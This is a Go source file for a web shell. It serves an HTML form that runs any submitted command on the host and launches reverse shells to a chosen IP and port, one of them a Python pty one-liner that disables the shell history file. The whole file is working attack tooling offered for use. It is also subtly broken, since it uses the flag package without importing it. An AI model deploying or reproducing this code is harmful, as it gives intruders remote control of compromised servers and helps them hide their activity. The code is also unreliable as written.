package main

import (
	"fmt"
	"html/template"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

type ShellHandler struct {
	mu sync.Mutex
}

func NewShellHandler() *ShellHandler {
	return &ShellHandler{}
}

func (sh *ShellHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	sh.mu.Lock()
	defer sh.mu.Unlock()

	var out string

	if r.Method == http.MethodPost {
		r.ParseForm()

		if len(r.Form["ip"]) > 0 && len(r.Form["port"]) > 0 {
			out = sh.handleReverseShell(r.Form)
		}

		if len(r.Form["cmd"]) > 0 {
			cmd := strings.Join(r.Form["cmd"], " ")
			out = sh.handleCommandExecution(cmd)
		}
	}

	sh.renderPage(w, out)
}

func (sh *ShellHandler) handleReverseShell(form map[string][]string) string {
	ip := strings.Join(form["ip"], " ")
	port := strings.Join(form["port"], " ")
	ver := strings.Join(form["ver"], " ")

	if runtime.GOOS != "windows" {
		if ver == "py" {
			payload := fmt.Sprintf("python -c 'import os, pty, socket; h = \"%s\"; p = %s; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'", ip, port)
			go runCommand(payload)
		} else {
			go reverseShell(ip, port)
		}
		return fmt.Sprintf("Reverse shell launched to %s:%s", ip, port)
	}
	return "No reverse shell on windows yet."
}

func (sh *ShellHandler) handleCommandExecution(cmd string) string {
	return fmt.Sprintf("$ %s\n%s", cmd, runCommand(cmd))
}

func (sh *ShellHandler) renderPage(w http.ResponseWriter, out string) {
	page := `
	<!DOCTYPE html>
	<html>
	<head>
	  <title>Web Shell</title>
	  <style>
	  div {border: 1px solid black; padding: 5px; width: 820px; background-color: #808080; margin-left: auto; margin-right: auto;}
	  </style>
	</head>
	<body bgcolor="#1a1a1a">
	  <div>
	  <b>Reverse Shell</b>
	  <form action="/" method="POST">
		IP: <input type="text" name="ip" value="localhost"/>
		Port: <input type="text" name="port" value="4444"/>
		<select name="ver">
		  <option value="go">Go</option>
		  <option value="py">py pty</option>
		</select>
		<input type="submit" value="run">
	  </form>
	  </div>
	  <br>
	  <div>
	  <textarea style="width:800px; height:400px;">{{.}}</textarea>
	  <br>
	  <form action="/" method="POST">
		<input type="text" name="cmd" style="width: 720px" autofocus>
		<input type="submit" value="run" style="width: 75px">
	  </form>
	  </div>
	</body>
	</html>
	`

	tmpl, err := template.New("page").Parse(page)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, out)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

func reverseShell(ip, port string) {
	c, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Printf("Error connecting to %s:%s - %s\n", ip, port, err)
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func runCommand(cmd string) string {
	var out string
	if runtime.GOOS == "windows" {
		sh := "cmd.exe"
		output, err := exec.Command(sh, "/K", cmd).Output()
		if err != nil {
			out = fmt.Sprintf("Error: %s", err)
		} else {
			out = string(output)
		}
	} else {
		sh := "sh"
		output, err := exec.Command(sh, "-c", cmd).Output()
		if err != nil {
			out = fmt.Sprintf("Error: %s", err)
		} else {
			out = string(output)
		}
	}
	return out
}

func main() {
	var ip, port string
	httpAddr := ":8080" // Default HTTP address 

	flag.StringVar(&ip, "ip", "", "IP")
	flag.StringVar(&port, "port", "8080", "Port")
	flag.StringVar(&httpAddr, "http", httpAddr, "HTTP server address")
	flag.Parse()

	sh := NewShellHandler()

	http.Handle("/", sh)
	fmt.Printf("Starting server on %s...\n", httpAddr)
	err := http.ListenAndServe(httpAddr, nil)
	if err != nil {
		fmt.Printf("Error starting server: %s\n", err)
	}
}
